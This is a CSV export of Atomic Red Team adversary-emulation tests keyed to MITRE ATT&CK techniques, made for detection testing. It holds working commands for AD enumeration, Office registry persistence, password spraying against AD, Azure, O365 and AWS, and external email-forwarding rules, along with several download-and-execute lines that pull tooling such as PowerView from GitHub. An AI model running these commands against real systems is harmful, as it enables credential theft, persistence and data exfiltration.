",windows,,,"Get-AdGroup -Filter *
",powershell,,,,,,
T1069.002,Permission Groups Discovery: Domain Groups,Enumerate Active Directory Groups with ADSISearcher,9f4e344b-8434-41b3-85b1-d38f29d148d0,"The following Atomic test will utilize ADSISearcher to enumerate groups within Active Directory.
Upon successful execution a listing of groups will output with their paths in AD.
Reference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/
",windows,,,"([adsisearcher]""objectcategory=group"").FindAll(); ([adsisearcher]""objectcategory=group"").FindOne()
",powershell,False,,,,,
T1069.002,Permission Groups Discovery: Domain Groups,Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting),43fa81fb-34bb-4b5f-867b-03c7dbe0e3d8,"When successful, accounts that do not require kerberos pre-auth will be returned.
Reference: https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html
",windows,,,"Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name
",powershell,False,,,powershell,"dependencies.0.description: Computer must be domain joined.

dependencies.0.prereq_command: if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: Write-Host Joining this computer to a domain must be done manually.

dependencies.1.description: Requires the Active Directory module for powershell to be installed.

dependencies.1.prereq_command: if(Get-Module -ListAvailable -Name ActiveDirectory) {exit 0} else {exit 1}

dependencies.1.get_prereq_command: Add-WindowsCapability -Online -Name ""Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0""

",
T1069.002,Permission Groups Discovery: Domain Groups,Get-DomainGroupMember with PowerView,46352f40-f283-4fe5-b56d-d9a71750e145,"Utilizing PowerView, run Get-DomainGroupMember to identify domain users. Upon execution, progress and info about groups within the domain being scanned will be displayed.
",windows,,,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroupMember ""Domain Admins""
",powershell,,,,,,
T1069.002,Permission Groups Discovery: Domain Groups,Get-DomainGroup with PowerView,5a8a181c-2c8e-478d-a943-549305a01230,"Utilizing PowerView, run Get-DomainGroup to identify the domain groups. Upon execution, Groups within the domain will be listed.
",windows,,,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose
",powershell,,,,,,
T1069.002,Permission Groups Discovery: Domain Groups,Active Directory Enumeration with LDIFDE,22cf8cb9-adb1-4e8c-80ca-7c723dfc8784,"Output information from Active Directory to a specified file. [Ldifde](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc731033(v=ws.11)) is a CLI tool for creating, modifying and deleting directory objects.
The test is derived from the CISA Report on Voly Typhoon. Reference: https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF
",windows,,,"ldifde.exe -f #{output_path}\#{output_file} -p subtree
",command_prompt,True,,"del #{output_path}\#{output_file}
",powershell,"dependencies.0.description: PowerShell ActiveDirectory Module must be installed

dependencies.0.prereq_command: Try {
    Import-Module ActiveDirectory -ErrorAction Stop | Out-Null
    exit 0
}
Catch {
    exit 1
}

dependencies.0.get_prereq_command: if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {
  Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online
} else {
  Install-WindowsFeature RSAT-AD-PowerShell
}

","input_arguments.output_path.description: Path to the file that ldifde will output

input_arguments.output_path.type: path

input_arguments.output_path.default: C:\Windows\temp

input_arguments.output_file.description: The filename to be created by ldifde

input_arguments.output_file.type: string

input_arguments.output_file.default: atomic_ldifde.txt

"
T1069.002,Permission Groups Discovery: Domain Groups,Active Directory Domain Search Using LDAP - Linux (Ubuntu)/macOS,d58d749c-4450-4975-a9e9-8b1d562755c2,"Output information from LDAPSearch. LDAP Password is the admin-user password on Active Directory
",linux,,,"ldapsearch -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{user} -w #{password} -b ""CN=Users,DC=#{domain},DC=#{top_level_domain}"" ""(objectClass=group)"" -s sub -a always -z 1000 dn 
",sh,False,,,sh,"dependencies.0.description: Packages sssd-ad sssd-tools realmd adcli installed and realm available, ldapsearch

dependencies.0.prereq_command: which ldapsearch

dependencies.0.get_prereq_command: echo missing ldapsearch command; exit 1

","input_arguments.domain.description: The domain to be tested

input_arguments.domain.type: string

input_arguments.domain.default: example

input_arguments.top_level_domain.description: The top level domain (.com, .test, .remote, etc... following domain, minus the .)

input_arguments.top_level_domain.type: string

input_arguments.top_level_domain.default: com

input_arguments.user.description: username@domain of a user

input_arguments.user.type: string

input_arguments.user.default: user@example.com

input_arguments.password.description: password of the user referenced inside user

input_arguments.password.type: string

input_arguments.password.default: s3CurePssw0rD!

"
T1137.002,Office Application Startup: Office Test,Office Application Startup Test Persistence (HKCU),c3e35b58-fe1c-480b-b540-7600fb612563,"Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office
application is started. Key is used for debugging purposes. Not created by default & exist in HKCU & HKLM hives.
",windows,,,"$wdApp = New-Object -COMObject ""Word.Application""
if(-not $wdApp.path.contains(""Program Files (x86)""))  
{
  Write-Host ""64-bit Office""
  reg add ""HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf"" /t REG_SZ /d ""PathToAtomicsFolder\T1137.002\bin\officetest_x64.dll"" /f       
}
else{
  Write-Host ""32-bit Office""
  reg add ""HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf"" /t REG_SZ /d ""PathToAtomicsFolder\T1137.002\bin\officetest_x86.dll"" /f
}
Stop-Process -Name ""WinWord"" 
Start-Process ""WinWord""
",powershell,,,"Stop-Process -Name ""notepad"",""WinWord"" -ErrorAction Ignore
Remove-Item ""HKCU:\Software\Microsoft\Office test\Special\Perf"" -ErrorAction Ignore",,"dependencies.0.description: Microsoft Word must be installed

dependencies.0.prereq_command: try {
  New-Object -COMObject ""Word.Application"" | Out-Null
  Stop-Process -Name ""winword""
  exit 0
} catch { exit 1 }

dependencies.0.get_prereq_command: Write-Host ""You will need to install Microsoft Word manually to meet this requirement""

dependencies.1.description: DLL files must exist on disk at specified location
dependencies.1.prereq_command: if ((Test-Path ""PathToAtomicsFolder\T1137.002\bin\officetest_x64.dll"") -and (Test-Path ""PathToAtomicsFolder\T1137.002\bin\officetest_x86.dll"")) {exit 0} else {exit 1}

dependencies.1.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\T1137.002\bin\"" -Force | Out-Null
Invoke-Webrequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.002/bin/officetest_x64.dll"" -UseBasicParsing -OutFile ""PathToAtomicsFolder\T1137.002\bin\officetest_x64.dll""
Invoke-Webrequest -Uri ""htps://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.002/bin/officetest_x86.dll"" -UseBasicParsing -OutFile ""PathToAtomicsFolder\T1137.002\bin\officetest_x86.dll""
",
T1123,Audio Capture,using device audio capture commandlet,9c3ad250-b185-4444-b5a9-d69218a10c95,"[AudioDeviceCmdlets](https://github.com/cdhunt/WindowsAudioDevice-Powershell-Cmdlet)
",windows,,,"powershell.exe -Command WindowsAudioDevice-Powershell-Cmdlet
",powershell,,,,,,
T1123,Audio Capture,Registry artefact when application use microphone,7a21cce2-6ada-4f7c-afd9-e1e9c481e44a,"[can-you-track-processes-accessing-the-camera-and-microphone](https://svch0st.medium.com/can-you-track-processes-accessing-the-camera-and-microphone-7e6885b37072)
",windows,,,"reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f
",command_prompt,,,"reg DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone\NonPackaged\C:#Windows#Temp#atomic.exe /f
",,,
T1123,Audio Capture,using Quicktime Player,c7a0bb71-70ce-4a53-b115-881f241b795b,"Use AppleScript to get Quicktime Player to record an audio file from the default microphone.

Should create a non-empty m4a file with sound from the microphone.

- requires Automation permissions but no additional microphone permissions
- saves file in /tmp by default. Other locations likely to require more permissions.
",macos,,,"sh #{filename} #{audiofile} #{duration}
",sh,,,"if test -w #{audiofile}; then
  rm #{audiofile}
fi
",,,"input_arguments.filename.description: Location of the script

input_arguments.filename.type: path

input_arguments.filename.default: PathToAtomicsFolder/T1123/src/T1123.sh

input_arguments.audiofile.description: Location of the recorded audio file

input_arguments.audiofile.type: path

input_arguments.audiofile.default: /tmp/T1123.m4a

input_arguments.duration.description: Length of recording to make in seconds

input_arguments.duration.type: integer

input_arguments.duration.default: 5

"
T1110.003,Brute Force: Password Spraying,Password Spray all Domain Users,90bc2e54-6c84-47a5-9439-0a2a92b4b175,"CAUTION! Be very careful to not exceed the password lockout threshold for users in the domain by running this test too frequently.
This atomic attempts to map the IPC$ share on one of the Domain Controllers using a password of Spring2020 for each user in the %temp%\users.txt list. Any successful authentications will be printed to the screen with a message like ""[*] username:password"", whereas a failed auth will simply print a period. Use the input arguments to specify your own password to use for the password spray.
Use the get_prereq_command's to create a list of all domain users in the temp directory called users.txt.
See the ""Windows FOR Loop Password Spraying Made Easy"" blog by @OrOneEqualsOne for more details on how these spray commands work. https://medium.com/walmartlabs/windows-for-loop-password-spraying-made-easy-c8cd4ebb86b5",windows,,,"@FOR /F %n in (%temp%\users.txt) do @echo | set/p=. & @net use %logonserver%\IPC$ /user:""%userdomain%\%n"" ""#{password}"" 1>NUL 2>&1 && @echo [*] %n:#{password} && @net use /delete %logonserver%\IPC$ > NUL
",command_prompt,False,,,,"dependencies.0.description: List of domain users to password spray must exits at %temp%\users.txt

dependencies.0.prereq_command: if not exist %temp%\users.txt (exit /b 1)

dependencies.0.get_prereq_command: ""PathToAtomicsFolder\T1110.003\src\parse_net_users.bat""

","input_arguments.password.description: The password to try for each user in users.txt

input_arguments.password.type: string

input_arguments.password.default: Spring2020

"
T1110.003,Brute Force: Password Spraying,Password Spray (DomainPasswordSpray),263ae743-515f-4786-ac7d-41ef3a0d4b2b,"Perform a domain password spray using the DomainPasswordSpray tool. It will try a single password against all users in the domain

https://github.com/dafthack/DomainPasswordSpray
",windows,,,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing); Invoke-DomainPasswordSpray -Password Spring2017 -Domain #{domain} -Force
",powershell,False,,,,,"input_arguments.domain.description: Domain to brute force against

input_arguments.domain.type: string

input_arguments.domain.default: $Env:USERDOMAIN

"
T1110.003,Brute Force: Password Spraying,Password spray all Active Directory domain users with a single password via LDAP against domain controller (NTLM or Kerberos),f14d956a-5b6e-4a93-847f-0c415142f07d,"Attempt to brute force all Active Directory domain users with a single password (called ""password spraying"") on a domain controller, via LDAP, with NTLM or Kerberos

Prerequisite: AD RSAT PowerShell module is needed and it must run under a domain user (to fetch the list of all domain users)
",windows,,,"if (""#{auth}"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {
  Write-Host ""Only 'NTLM' and 'Kerberos' auth methods are supported""
  exit 1
}

$DomainUsers = Get-ADUser -LDAPFilter '(&(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' -Server #{domain} | Select-Object -ExpandProperty SamAccountName

[System.Reflection.Assembly]::LoadWithPartialName(""System.DirectoryServices.Protocols"") | Out-Null
$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(""#{domain}"",389)

$DomainUsers | Foreach-Object {
  $user = $_
  $password = '#{password}'

  $credz = new-object System.Net.NetworkCredential($user, $password, ""#{domain}"")
  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::#{auth})
  try {
    Write-Host "" [-] Attempting ${password} on account ${user}.""
    $conn.bind()
    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
    Write-Host "" [!] ${user}:${password} are valid credentials!""
  } catch {
    Write-Host $_.Exception.Message
  }
}
Write-Host ""End of password spraying""
",powershell,False,,,,,"input_arguments.password.description: single password we will attempt to auth with (if you need several passwords, then it is a bruteforce so see T1110.001)

input_arguments.password.type: string

input_arguments.password.default: P@ssw0rd!

input_arguments.domain.description: Domain FQDN

input_arguments.domain.type: string

input_arguments.domain.default: $env:UserDnsDomain

input_arguments.auth.description: authentication method to choose between ""NTLM"" and ""Kerberos""

input_arguments.auth.type: string

input_arguments.auth.default: NTLM

"
T1110.003,Brute Force: Password Spraying,Password spray all Azure AD users with a single password,a8aa2d3e-1c52-4016-bc73-0f8854cfa80a,"Attempt to brute force all Azure AD users with a single password (called ""password spraying"") via AzureAD Powershell module.
Valid credentials are only needed to fetch the list of Azure AD users.
",azure-ad,,,"Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String ""#{valid_password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{valid_username}"", $Pword
Connect-AzureAD -Credential $Credential > $null

($Users = Get-AzureADUser -All $true) > $null
Disconnect-AzureAD > $null
$PWord = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force

$Users | Foreach-Object {
  $user = $_.UserPrincipalName
  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""$user"", $Pword
  try {
    Write-Host "" [-] Attempting #{password} on account ${user}.""
    Connect-AzureAD -Credential $Credential 2>&1> $null
    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
    Write-Host "" [!] ${user}:#{password} are valid credentials!`r`n""
    Disconnect-AzureAD > $null
  } catch {
    Write-Host "" [-] ${user}:#{password} invalid credentials.`r`n""
  }
}
Write-Host ""End of password spraying""
",powershell,False,,,powershell,"dependencies.0.description: AzureAD module must be installed.

dependencies.0.prereq_command: try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}

dependencies.0.get_prereq_command: Install-Module -Name AzureAD -Force

","input_arguments.password.description: Single password we will attempt to auth with (if you need several passwords, then it is a bruteforce so see T1110.001)

input_arguments.password.type: string

input_arguments.password.default: P@ssw0rd!

input_arguments.valid_username.description: Valid username to retrieve Azure AD users. We encourage users running this atomic to add a valid microsoft account domain; for eg <valid_test_user>@<valid_ms_account.com>

input_arguments.valid_username.type: string

input_arguments.valid_username.default: bruce.wayne@contoso.com

input_arguments.valid_password.description: Valid password to authenticate as valid_username in the <valid_ms_account>

input_arguments.valid_password.type: string

input_arguments.valid_password.default: iamthebatman

"
T1110.003,Brute Force: Password Spraying,WinPwn - DomainPasswordSpray Attacks,5ccf4bbd-7bf6-43fc-83ac-d9e38aff1d82,DomainPasswordSpray Attacks technique via function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
domainpassspray -consoleoutput -noninteractive -emptypasswords",powershell,,,,,,
T1110.003,Brute Force: Password Spraying,Password Spray Invoke-DomainPasswordSpray Light,b15bc9a5-a4f3-4879-9304-ea0011ace63a,"Perform a domain password spray using the same core method of the [DomainPasswordSpray tool](https://github.com/dafthack/DomainPasswordSpray) 
but without all the extra code that makes the script get blocked by many AVs. 
This atomic test will attempt a single password against all users in a password list at $env:Temp\usersdpsLight.txt. You can create this file manually
or with the automated prereq_command. The prereq_command will limit the user list to 200 users by default to help you avoid massive account lockout.
",windows,,,"function Invoke-dpsLight ($Password, $userlist) {
$users = Get-Content $userlist
$Domain = ""LDAP://"" + ([ADSI]"""").distinguishedName
foreach ($User in $users) {
  $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)
  if ($Domain_check.name -ne $null) {
    Write-Host -ForegroundColor Green ""Password found for User:$User Password:$Password""
  }
  else { Write-Host "". "" -NoNewline}
}
Write-Host -ForegroundColor green ""Finished""
}
Invoke-dpsLight ""#{password}"" $env:Temp\usersdpsLight.txt
",powershell,False,,,,"dependencies.0.description: Username file must exist at $env:Temp\usersdpsLight.txt

dependencies.0.prereq_command: if (Test-Path  $env:Temp\usersdpsLight.txt) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: Write-Host -NoNewLine ""Reading Users."" # this code modifed from https://github.com/ZoomerHulkHogan/Powershell-Domain-User-Enumeration
$netOutput = net users /domain
$netOutput = [System.Collections.ArrayList]($netOutput[6..($netOutput.length-3)])
$userLimit = #{user_limit}; $usercount = 0
foreach ($line in $netOutput) {
  if($usercount -ge $userLimit){break}
  $line = $line.trim()
  $line = $line -split '\s\s+'
  foreach ($user in $line){
    if($usercount -ge $userLimit){break}
    Add-Content $env:Temp\usersdpsLight.txt $user
    $usercount = $usercount + 1
    }  
}
Write-Host ""Usernames saved to $env:Temp\usersdpsLight.txt""

","input_arguments.user_limit.description: The max number of users to put in the list when running the prereq_command

input_arguments.user_limit.type: integer

input_arguments.user_limit.default: 200

input_arguments.password.description: The password to try for each user in users.txt

input_arguments.password.type: string

input_arguments.password.default: Spring2020

"
T1110.003,Brute Force: Password Spraying,Password Spray Microsoft Online Accounts with MSOLSpray (Azure/O365),f3a10056-0160-4785-8744-d9bd7c12dc39,"This test attempts to brute force a list of Microsoft Online (Azure/O365) users with a single password via the MSOLSpray Powershell module.
",azure-ad,,,"import-module ""PathToAtomicsFolder\..\ExternalPayloads\MSOLSpray.ps1""
Invoke-MSOLSpray -UserList ""#{user_list}"" -Password ""#{password}""
",powershell,False,,,powershell,"dependencies.0.description: MSOLSpray module must exist in PathToAtomicsFolder\..\ExternalPayloads.

dependencies.0.prereq_command: if (test-path ""PathToAtomicsFolder\..\ExternalPayloads\MSOLSpray.ps1""){exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
invoke-webrequest ""https://raw.githubusercontent.com/dafthack/MSOLSpray/922f159104fb3ec77c9fc6507a6388a05c227b5f/MSOLSpray.ps1"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\MSOLSpray.ps1""

","input_arguments.password.description: Single password to try against the list of user accounts

input_arguments.password.type: string

input_arguments.password.default: P@ssword1

input_arguments.user_list.description: File path to list of users (one per line, formatted as user@subdomain.onmicrosoft.com)

input_arguments.user_list.type: string

input_arguments.user_list.default: $env:temp\T1110.003UserList.txt

"
T1110.003,Brute Force: Password Spraying,Password Spray using Kerbrute Tool,c6f25ec3-6475-47a9-b75d-09ac593c5ecb,"Test a single password against a list of users
",windows,,,"cd ""PathToAtomicsFolder\..\ExternalPayloads""
.\kerbrute.exe passwordspray --dc #{domaincontroller} -d #{domain} ""PathToAtomicsFolder\..\ExternalPayloads\passwordspray.txt"" password132 
",powershell,False,,,powershell,"dependencies.0.description: kerbrute.exe must exist in PathToAtomicsFolder\..\ExternalPayloads

dependencies.0.prereq_command: if (test-path ""PathToAtomicsFolder\..\ExternalPayloads\kerbrute.exe""){exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
invoke-webrequest ""https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\kerbrute.exe""

dependencies.1.description: passwordspray.txt must exist in PathToAtomicsFolder\..\ExternalPayloads

dependencies.1.prereq_command: if (test-path ""PathToAtomicsFolder\..\ExternalPayloads\passwordspray.txt""){exit 0} else {exit 1}

dependencies.1.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
invoke-webrequest ""https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.003/src/passwordspray.txt?raw=true"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\passwordspray.txt""

","input_arguments.domaincontroller.description: Domain controller where test will be run

input_arguments.domaincontroller.type: string

input_arguments.domaincontroller.default: $ENV:userdnsdomain

input_arguments.domain.description: Domain where you will be testing

input_arguments.domain.type: string

input_arguments.domain.default: $ENV:userdomain

"
T1110.003,Brute Force: Password Spraying,AWS - Password Spray an AWS using GoAWSConsoleSpray,9c10d16b-20b1-403a-8e67-50ef7117ed4e,"GoAWSConsoleSpray is a tool that can be used to spray AWS IAM Console Credentials in order to identify a valid login for a user account built by WhiteOakSecurity. For more details reagrding the tool, check - https://www.whiteoaksecurity.com/blog/goawsconsolespray-password-spraying-tool/
",iaas:aws,,,"cd /tmp
git clone git@github.com:WhiteOakSecurity/GoAWSConsoleSpray.git
cd /tmp/GoAWSConsoleSpray
go run main.go GoAWSConsoleSpray -a #{aws_account_id} -u PathToAtomicsFolder/T1110.003/src/aws_users.txt -p PathToAtomicsFolder/T1110.003/src/aws_passwords.txt
",sh,False,,"rm -rf /tmp/GoAWSConsoleSpray
",,"dependencies.0.description: Check if go is installed

dependencies.0.prereq_command: go version

dependencies.0.get_prereq_command: echo Install GO

","input_arguments.aws_account_id.description: ID of the AWS account

input_arguments.aws_account_id.type: string

input_arguments.aws_account_id.default: XXXXXXXX

"
T1072,Software Deployment Tools,Radmin Viewer Utility,b4988cad-6ed2-434d-ace5-ea2670782129,"An adversary may use Radmin Viewer Utility to remotely control Windows device, this will start the radmin console.
",windows,,,"""%PROGRAMFILES(x86)%/#{radmin_exe}""
",command_prompt,True,,,powershell,"dependencies.0.description: Radmin Viewer Utility must be installed at specified location (#{radmin_exe})

dependencies.0.prereq_command: if (Test-Path ""${env:ProgramFiles(x86)}/#{radmin_exe}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: Write-Host Downloading radmin installer
New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://www.radmin.com/download/Radmin_Viewer_3.5.2.1_EN.msi"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\#{radmin_installer}""
Write-Host Install Radmin
Start-Process msiexec  -Wait -ArgumentList /i , ""PathToAtomicsFolder\..\ExternalPayloads\#{radmin_installer}"", /qn

","input_arguments.radmin_installer.description: Radmin Viewer installer

input_arguments.radmin_installer.type: path

input_arguments.radmin_installer.default: RadminViewer.msi

input_arguments.radmin_exe.description: The radmin.exe executable from RadminViewer.msi

input_arguments.radmin_exe.type: path

input_arguments.radmin_exe.default: Radmin Viewer 3/Radmin.exe

"
T1072,Software Deployment Tools,PDQ Deploy RAT,e447b83b-a698-4feb-bed1-a7aaf45c3443,"An adversary may use PDQ Deploy Software to deploy the Remote Adminstartion Tool, this will start the PDQ console.
",windows,,,"""%PROGRAMFILES(x86)%/#{PDQ_Deploy_exe}""
",command_prompt,True,,,powershell,"dependencies.0.description: PDQ Deploy will be installed at specified location (#{PDQ_Deploy_exe})

dependencies.0.prereq_command: if (Test-Path ""${env:ProgramFiles(x86)}/#{PDQ_Deploy_exe}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: Write-Host Downloading PDQ Deploy installer
New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://download.pdq.com/release/19/Deploy_19.3.350.0.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\#{PDQ_Deploy_installer}""
Write-Host Install PDQ Deploy
Start-Process ""PathToAtomicsFolder\..\ExternalPayloads\#{PDQ_Deploy_installer}"" -Wait -ArgumentList ""/s""

","input_arguments.PDQ_Deploy_installer.description: PDQ Deploy Install

input_arguments.PDQ_Deploy_installer.type: path

input_arguments.PDQ_Deploy_installer.default: PDQDeploysetup.exe

input_arguments.PDQ_Deploy_exe.description: The PDQDeployConsole.exe executable from PDQDeploysetup.exe

input_arguments.PDQ_Deploy_exe.type: path

input_arguments.PDQ_Deploy_exe.default: Admin Arsenal/PDQ Deploy/PDQDeployConsole.exe

"
T1114.003,Email Collection: Email Forwarding Rule,Office365 - Email Forwarding,3234117e-151d-4254-9150-3d0bac41e38c,"Creates a new Inbox Rule to forward emails to an external user via the ""ForwardTo"" property of the New-InboxRule Powershell cmdlet.
",office-365,,,"$secure_pwd = ""#{password}"" | ConvertTo-SecureString -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $secure_pwd
Connect-ExchangeOnline -Credential $creds
New-InboxRule -Name ""#{rule_name}"" -ForwardTo ""#{forwarding_email}""
",powershell,False,,"$secure_pwd = ""#{password}"" | ConvertTo-SecureString -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $secure_pwd
Connect-ExchangeOnline -Credential $creds
Get-InboxRule | Where-Object { $_.Name -eq ""#{rule_name}"" | ForEach-Object { Remove-InboxRule -Identity $_.Identity -Force -Confirm:$False }
",powershell,"dependencies.0.description: ExchangeOnlineManagement PowerShell module must be installed. Your user must also have an Exchange license. 

dependencies.0.prereq_command: $RequiredModule = Get-Module -Name ExchangeOnlineManagement -ListAvailable
if (-not $RequiredModule) {exit 1}
if (-not $RequiredModule.ExportedCommands['Connect-ExchangeOnline']) {exit 1} else {exit 0}

dependencies.0.get_prereq_command: Install-Module -Name ExchangeOnlineManagement         
Import-Module ExchangeOnlineManagement

","input_arguments.username.description: office-365 username

input_arguments.username.type: string

input_arguments.username.default: None

input_arguments.password.description: office-365 password

input_arguments.password.type: string

input_arguments.password.default: None

input_arguments.rule_name.description: email rule name

input_arguments.rule_name.type: string

input_arguments.rule_name.default: Atomic Red Team Email Rule

input_arguments.forwarding_email.description: destination email addresses

input_arguments.forwarding_email.type: string

input_arguments.forwarding_email.default: Atomic_Operator@fakeemail.aq

"
T1564.001,Hide Artifacts: Hidden Files and Directories,Create a hidden file in a hidden directory,61a782e5-9a19-40b5-8ba4-69a4b9f3d7be,"Creates a hidden file inside a hidden directory
",linux,macos,,"mkdir /var/tmp/.hidden-directory
echo ""T1564.001"" > /var/tmp/.hidden-directory/.hidden-file
",sh,,,"rm -rf /var/tmp/.hidden-directory/
",,,
T1564.001,Hide Artifacts: Hidden Files and Directories,Mac Hidden file,cddb9098-3b47-4e01-9d3b-6f5f323288a9,"Hide a file on MacOS
",macos,,,"xattr -lr * / 2>&1 /dev/null | grep -C 2 ""00 00 00 00 00 00 00 00 40 00 FF FF FF FF 00 00""
",sh,,,,,,
T1564.001,Hide Artifacts: Hidden Files and Directories,Create Windows System File with Attrib,f70974c8-c094-4574-b542-2c545af95a32,"Creates a file and marks it as a system file using the attrib.exe utility. Upon execution, open the file in file explorer then open Properties > Details
and observe that the Attributes are ""SA"" for System and Archive.
",windows,,,"attrib.exe +s #{file_to_modify}
",command_prompt,True,,"del /A:S #{file_to_modify} >nul 2>&1
",command_prompt,"dependencies.0.description: The file must exist on disk at specified location (#{file_to_modify})

dependencies.0.prereq_command: IF EXIST #{file_to_modify} ( EXIT 0 ) ELSE ( EXIT 1 )

dependencies.0.get_prereq_command: echo system_Attrib_T1564.001 >> #{file_to_modify}

","input_arguments.file_to_modify.description: File to modify using Attrib command

input_arguments.file_to_modify.type: string

input_arguments.file_to_modify.default: %temp%\T1564.001.txt

"
T1564.001,Hide Artifacts: Hidden Files and Directories,Create Windows Hidden File with Attrib,dadb792e-4358-4d8d-9207-b771faa0daa5,"Creates a file and marks it as hidden using the attrib.exe utility.Upon execution, open File Epxplorer and enable View > Hidden Items. Then, open Properties > Details on the file
and observe that the Attributes are ""SH"" for System and Hidden.
",windows,,,"attrib.exe +h #{file_to_modify}
",command_prompt,True,,"del /A:H #{file_to_modify} >nul 2>&1
",command_prompt,"dependencies.0.description: The file must exist on disk at specified location (#{file_to_modify})

dependencies.0.prereq_command: IF EXIST #{file_to_modify} ( EXIT 0 ) ELSE ( EXIT 1 )

dependencies.0.get_prereq_command: echo system_Attrib_T1564.001 >> #{file_to_modify}

","input_arguments.file_to_modify.description: File to modify using Attrib command

input_arguments.file_to_modify.type: string

input_arguments.file_to_modify.default: %temp%\T1564.001.txt

"
T1564.001,Hide Artifacts: Hidden Files and Directories,Hidden files,3b7015f2-3144-4205-b799-b05580621379,"Requires Apple Dev Tools
",macos,,,"setfile -a V #{filename}
",sh,,,,,,"input_arguments.filename.description: path of file to hide

input_arguments.filename.type: path

input_arguments.filename.default: /tmp/evil

"
T1564.001,Hide Artifacts: Hidden Files and Directories,Hide a Directory,b115ecaf-3b24-4ed2-aefe-2fcb9db913d3,"Hide a directory on MacOS
",macos,,,"touch /var/tmp/T1564.001_mac.txt
chflags hidden /var/tmp/T1564.001_mac.txt
",sh,,,"rm /var/tmp/T1564.001_mac.txt
",,,
T1564.001,Hide Artifacts: Hidden Files and Directories,Show all hidden files,9a1ec7da-b892-449f-ad68-67066d04380c,"Show all hidden files on MacOS
",macos,,,"defaults write com.apple.finder AppleShowAllFiles YES
",sh,,,"defaults write com.apple.finder AppleShowAllFiles NO
